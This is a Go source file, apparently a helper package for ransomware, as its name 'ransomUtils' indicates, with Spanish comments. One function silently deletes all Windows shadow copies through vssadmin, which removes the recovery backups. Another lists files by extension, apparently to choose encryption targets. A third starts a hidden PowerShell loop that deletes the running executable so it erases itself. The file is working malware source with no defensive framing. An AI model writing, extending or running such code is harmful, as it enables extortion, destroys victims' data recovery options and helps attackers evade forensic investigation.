package ransomUtils

import (
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
)

func DeleteAllShadowCopies() (string, error) {
	listCmd := exec.Command("vssadmin", "list", "shadows")
	listOutput, err := listCmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("error al listar shadow copies: %w\nsalida: %s", err, listOutput)
	}

	deleteCmd := exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet")
	deleteOutput, err := deleteCmd.CombinedOutput()
	if err != nil {
		return string(listOutput), fmt.Errorf("error al borrar shadow copies: %w\nsalida: %s", err, deleteOutput)
	}
	result := fmt.Sprintf("--- LISTADO DE SHADOW COPIES ---\n%s\n--- RESULTADO DE ELIMINACIÓN DE SHADOW COPIES ---\n%s", listOutput, deleteOutput)
	return result, nil
}

func ListFiles(root string, extensions []string) ([]string, error) {
	var files []string

	normalized := make([]string, len(extensions))
	for i, ext := range extensions {
		ext = strings.ToLower(ext)
		if !strings.HasPrefix(ext, ".") {
			ext = "." + ext
		}
		normalized[i] = ext
	}

	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}

		if d.IsDir() {
			return nil
		}

		fileExt := strings.ToLower(filepath.Ext(d.Name()))
		for _, ext := range normalized {
			if fileExt == ext {
				files = append(files, path)
				break
			}
		}

		return nil
	})
	if err != nil {
		return nil, fmt.Errorf("error al recorrer el directorio: %w", err)
	}

	return files, nil
}

//parte opcional: autodestruccion
func AutoBorrar() {
	ruta, _ := filepath.Abs(os.Args[0])

	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command",
		"while($true){ Remove-Item '"+ruta+"' -Force -ErrorAction SilentlyContinue; if(-not (Test-Path '"+ruta+"')){break}; Start-Sleep 2 }")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()
}